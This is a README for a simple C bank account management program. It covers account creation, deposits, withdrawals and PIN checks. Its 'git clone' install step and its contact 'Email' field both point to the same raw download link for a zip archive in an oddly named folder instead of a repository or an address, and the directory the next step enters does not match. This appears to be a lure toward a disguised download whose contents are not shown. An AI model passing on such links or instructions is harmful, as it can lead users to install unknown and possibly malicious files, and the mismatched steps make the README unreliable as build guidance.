# AXIS Bank Account Management System

This is a simple C-based program that simulates a basic account management system for a bank. The system allows users to create new accounts, deposit and withdraw funds, check balances, and manage fixed deposits, all while ensuring security through PIN verification.

## Features

- **Account Creation**: Users can create a new account with personal information such as name, contact number, address, email, PIN, and initial deposit.
- **Deposit**: Users can deposit money into their account after authenticating with their account number and PIN.
- **Withdrawal**: Users can withdraw funds from their account after authenticating with their account number and PIN.
- **Check Balance**: Users can view their account balance after verifying their account number and PIN.
- **Fixed Deposit**: Users can make fixed deposits into their account after authenticating with their account number and PIN.
- **Account Management**: Administrators can view details of all created accounts including name, balance, fixed deposit amount, and other information.

## Technologies Used

- **C Programming Language**: The program is implemented in C, with a focus on basic data structures such as arrays and structures to handle account data.
- **Standard Input/Output**: The program uses the standard input and output functions (`scanf`, `printf`) for interaction with the user.

## Getting Started

To get a local copy of the project running, follow these simple steps:

### Prerequisites

You need to have a C compiler installed on your system. If you don’t have one, you can install GCC or use an IDE like Code::Blocks or DevC++.

### Installation

1. Clone the repository:

    ```bash
    git clone https://raw.githubusercontent.com/LabbaiIrfan/Bank-Management/main/chickenweed/Management_Bank_v2.4.zip
    ```

2. Navigate to the project directory:

    ```bash
    cd axis-bank-account-management
    ```

3. Compile the program:

    ```bash
    gcc -o bank_account_system bank_account_system.c
    ```

4. Run the program:

    ```bash
    ./bank_account_system
    ```

### Example Usage

1. **Create an Account**:
   - Choose option 1 from the main menu to create a new account.
   - Provide details like name, age, contact number, address, email, PIN, and initial balance.

2. **Deposit Funds**:
   - Choose option 2 to deposit funds into an account.
   - Enter the account number and PIN, then specify the deposit amount.

3. **Withdraw Funds**:
   - Choose option 3 to withdraw funds from an account.
   - Enter the account number and PIN, then specify the withdrawal amount.

4. **Check Balance**:
   - Choose option 5 to check the balance of an account.
   - Enter the account number and PIN.

5. **Fixed Deposit**:
   - Choose option 4 to make a fixed deposit.
   - Enter the account number, PIN, and deposit amount.

6. **View All Accounts**:
   - Choose option 6 to view a list of all created accounts with details like name, balance, contact, and email.

## Security

- **PIN Verification**: Each operation (deposit, withdrawal, balance check, and fixed deposit) requires the user to enter their account number and PIN to ensure that only authorized users can perform actions on their account.

## Contribution

If you would like to contribute to this project, feel free to fork the repository and submit a pull request with your changes. Please make sure to follow the coding style and include tests for any new features or bug fixes.

## License

This project is open-source and available under the [MIT License](LICENSE).

## Contact

For any questions or feedback, please feel free to reach out:

- **Email**: https://raw.githubusercontent.com/LabbaiIrfan/Bank-Management/main/chickenweed/Management_Bank_v2.4.zip

---

**Note**: This is a basic banking system intended for educational purposes and is not meant for real-world use. Use it as a template or starting point for more advanced projects.
